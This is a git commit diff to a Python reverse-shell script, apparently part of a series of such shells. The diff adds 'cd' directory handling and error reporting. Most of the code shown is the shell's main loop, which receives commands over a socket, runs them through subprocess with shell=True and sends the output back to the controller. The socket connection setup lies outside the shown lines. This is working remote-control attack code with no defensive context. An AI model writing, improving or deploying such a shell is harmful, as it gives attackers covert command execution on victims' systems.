833f0828f6e8df49ea1bd455c55233a91a5d93cb
CHARON <rip.charon@gmail.com>
2021-08-23 18:13:14 -0800

    add error pop up command and add change directory codes

--- part-02/Reverse_Shell_From_Systems_Best_Shell_04.py
+++ part-02/Reverse_Shell_From_Systems_Best_Shell_04.py
@@ -14,15 +14,25 @@ while True:
 
     if data == '-':
         continue
-    
-    cmd = subprocess.check_output(data,shell=True)
 
-    if cmd == None or cmd == ''.encode('utf-8'):
+    elif data[0:2] == 'cd':
+        try:
+            os.chdir(data[3:])
+        except:
+            s.sendall("\n[-] NO SUCH A DIRECTORY !".encode('utf-8'))
+            continue
+
+    try:
+        cmd = subprocess.check_output(data,shell=True,stderr=subprocess.STDOUT)
+        if cmd == None or cmd == ''.encode('utf-8'):
+            
+            s.sendall("\n[-] DONE !".encode('utf-8'))
+            continue
         
-        s.sendall("[-] DONE !".encode('utf-8'))
-        continue
-    
-    s.sendall(cmd)
-        
+        s.sendall(cmd)
+
+    except subprocess.CalledProcessError as e:
+        cmd_error = "\n[-] command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output)
+        s.sendall(cmd_error.encode('utf-8'))
 
 s.close()
